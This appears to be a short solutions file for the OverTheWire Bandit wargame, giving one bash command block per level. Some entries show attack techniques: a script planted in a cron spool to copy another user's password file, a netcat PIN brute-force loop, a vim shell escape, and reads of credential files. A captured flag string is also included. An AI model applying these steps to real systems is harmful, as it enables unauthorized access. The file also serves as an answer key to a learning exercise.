# bandit0
```bash
cat readme
```

# bandit1
```bash
cat ./
```

# bandit2
```bash
cat spaces\ in\ this\ filename
```

# bandit3
```bash
cat inhere/.hidden
```

# bandit4
```bash
cd inhere
for f in $(ls); do file "./$f"; done
cat ./-file07
```

# bandit5
```bash
cat $(find ./ -size 1033c)
```

# bandit6
```bash
cat $(find -user bandit7 -group bandit6 -size 33c 2>/dev/null)
```

# bandit7
```bash
cat data.txt | grep millionth | awk '{print $2}'
```

# bandit8
```bash
cat data.txt | sort | uniq -c | sort -u | tail -n1 | awk '{print $2}'
```

# bandit9
```bash
strings data.txt | grep -e '^==='
```

# bandit10
```bash
cat data.txt | base64 -d | cut -d" " -f4
```

# bandit11
```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

# bandit12
```bash
cat data.txt | xxd -r > /tmp/bandit/data
file data
mv data data.gz
gunzip data.gz
bzip2 -d data
mv data.out data.gz
gunzip data.gz
tar xf data
...
```

# bandit13
```bash
scp -P 2220 bandit13@bandit.labs.overthewire.org:sshkey.private id_rsa
chmod 400 id_rsa
ssh bandit14@bandit.labs.overthewire.org -p 2220 -i id_rsa cat /etc/bandit_pass/bandit14
rm -f id_rsa
```

# bandit14
```bash
nc localhost 30000
```

# bandit15
```bash
openssl s_client -connect localhost:30001
```

# bandit16
```bash
nmap --script ssl-enum-ciphers -p 31000-32000 localhost
openssl s_client -connect localhost:31790
(get SSH key)
ssh bandit14@bandit.labs.overthewire.org -p 2220 -i id_rsa cat /etc/bandit_pass/bandit17
```

# bandit17
```bash
diff passwords.old passwords.new
```

# bandit18
```bash
ssh ... cat readme
```

# bandit19
```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

# bandit20
```bash
nc -nlvp 3000
./suconnect 3000
```

# bandit21
```bash
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

# bandit22
```bash
cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
```

# bandit23
```bash
bandit23@bandit:~$ cd /tmp/bandito
bandit23@bandit:/tmp/bandito$ cat > payload.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandito/flag
bandit23@bandit:/tmp/bandito$ chmod +x payload.sh
bandit23@bandit:/tmp/bandito$ cp payload.sh /var/spool/bandit24/
bandit23@bandit:/tmp/bandito$ ls
payload.sh
bandit23@bandit:/tmp/bandito$ ls
flag  payload.sh
bandit23@bandit:/tmp/bandito$ cat flag
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

# bandit24
```bash
bandit24@bandit:~$ for i in $(seq -f "%04g" 0 9999); do echo "$(cat /etc/bandit_pass/bandit24) $i"; done | nc localhost 30002
```

# bandit25 + bandit26
```bash
cat /etc/passwd | grep bandit26
cat /usr/bin/showtext
(resize terminal window to be really small)
ssh -i bandit26.sshkey bandit26@localhost
v (vim)
:r /etc/bandit_pass/bandit26
:set shell=/bin/bash
:shell
./bandit27-do cat /etc/bandit_pass/bandit27
```

# bandit27
```bash
cd /tmp/bandito
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
cat repo/README
cd .. && rm -rf repo
```

# bandit28
```bash
cd /tmp/bandito
git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
cd repo
git checkout 186a103
cat README.md
cd .. && rm -rf repo
```

# bandit29
```bash
cd /tmp/bandito
git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
cd repo
git show-branch --all
git checkout dev
cat README.md
cd .. && rm -rf repo
```

# bandit30
```bash
cd /tmp/bandito
git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
cd repo
git tag
git show secret
cd .. && rm -rf repo
```

# bandit31
```bash
cd /tmp/bandito
git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
cd repo
git tag
git show secret
cd .. && rm -rf repo
```

# bandit32
```bash
$0
cat /etc/bandit_pass/bandit33
```
